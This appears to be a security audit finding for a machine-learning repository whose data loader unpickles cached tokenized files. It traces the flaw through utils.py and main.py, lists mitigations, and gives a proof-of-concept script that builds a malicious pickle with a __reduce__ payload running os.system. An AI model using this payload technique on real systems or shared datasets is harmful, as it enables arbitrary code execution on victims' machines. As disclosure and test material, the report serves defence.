- Vulnerability Name: Deserialization of Untrusted Data via Pickle
- Description:
    1. An attacker modifies the preprocessed data file (e.g., `mwoz_64.pkl`) located in the `dataset/{args.data}/tokenized/` directory. This file is created by `utils.py` and contains pickled Python objects.
    2. The user downloads and runs `train.sh` or `test.sh`.
    3. `main.py` is executed, which in turn calls `utils.load_data(args, tokenizer)`.
    4. `utils.load_data` checks for the existence of the pickled data file. If it exists and `args.rewrite_data` is not set, it loads the data using `pickle.read_pkl`, which calls `pickle.load`.
    5. If the attacker has injected malicious code into the pickled data, `pickle.load` will execute this code during deserialization.
- Impact: Arbitrary code execution. The attacker can gain full control over the user's machine.
- Vulnerability Rank: Critical
- Currently Implemented Mitigations: None. The code directly uses `pickle.load` without any safety measures.
- Missing Mitigations:
    - Avoid using pickle for loading data from potentially untrusted sources.
    - Use safer serialization formats like JSON or CSV if possible, or formats that are designed to be safe for deserialization.
    - If pickle is necessary, implement integrity checks (e.g., digital signatures) to ensure the data has not been tampered with.
    - Provide clear warnings to users about the security risks of running code from untrusted sources and advise them to only use original, unmodified scripts and data.
- Preconditions:
    - The attacker needs to be able to replace the preprocessed data files in the `dataset/{args.data}/tokenized/` directory before the user runs the training or testing scripts. This is feasible in a social engineering attack scenario where the attacker distributes a modified version of the repository.
    - The user must execute `train.sh` or `test.sh` (or directly `main.py`) without the `--rewrite_data` flag, so that the existing pickle file is loaded.
- Source Code Analysis:
    1. In `/code/src/utils.py`, the function `read_pkl(filename)` is defined:
       ```python
       def read_pkl(filename):
           with open(filename, 'rb') as f:
               return pickle.load(f)
       ```
       This function uses `pickle.load` to deserialize data from a file. `pickle.load` is known to be vulnerable to arbitrary code execution if the data source is untrusted.
    2. This function is called by `load_data(args, tokenizer)` in `/code/src/utils.py`:
       ```python
       if os.path.exists(f'{dirname}/tokenized/{args.data}_{args.max_seq_len}.pkl') and not args.rewrite_data:
           return read_pkl(f'{dirname}/tokenized/{args.data}_{args.max_seq_len}.pkl')
       ```
       The `load_data` function checks if a pre-tokenized data file exists. If it does and the `rewrite_data` flag is not set, it loads the data from the pickle file using `read_pkl`.
    3. `load_data` is called in `/code/src/main.py` in both training and evaluation modes.
    4. `train.sh` and `test.sh` scripts execute `main.py` without `--rewrite_data`, making the code vulnerable by default if malicious pickle files are present.
- Security Test Case:
    1. Prepare malicious pickle file:
       - Create a malicious Python object that executes code when unpickled. For example, create a file named `malicious_pickle_gen.py` with the following content:
         ```python
         import pickle
         import os

         class Malicious(object):
             def __reduce__(self):
                 return (os.system, ('touch /tmp/pwned',))

         malicious_data = {'train': {'input_ids': [], 'input_text': [], 'act_seq': [], 'sat': [], 'schema_ids': [], 'schema_text': [Malicious()]}, 'valid': {'input_ids': [], 'input_text': [], 'act_seq': [], 'sat': [], 'schema_ids': [], 'schema_text': []}, 'test': {'input_ids': [], 'input_text': [], 'act_seq': [], 'sat': [], 'schema_ids': [], 'schema_text': []}, 'act_list': {}}

         with open('/tmp/malicious_mwoz_64.pkl', 'wb') as f:
             pickle.dump(malicious_data, f)
         ```
       - Run `python malicious_pickle_gen.py` to generate the malicious pickle file `/tmp/malicious_mwoz_64.pkl`.
    2. Replace legitimate data file:
       - Assume the user is using `mwoz` dataset and `max_seq_len=64`.
       - Replace the file `/code/dataset/mwoz/tokenized/mwoz_64.pkl` with `/tmp/malicious_mwoz_64.pkl`. Use the command: `cp /tmp/malicious_mwoz_64.pkl /code/dataset/mwoz/tokenized/mwoz_64.pkl`
    3. Run training script:
       - Navigate to the `/code` directory: `cd /code`
       - Execute the training script: `./train.sh`
    4. Check for execution:
       - After running the script, check if the file `/tmp/pwned` exists. Use the command: `ls /tmp/pwned`. If this command shows the file `/tmp/pwned`, it confirms that the malicious code from the pickle file was executed, demonstrating the vulnerability.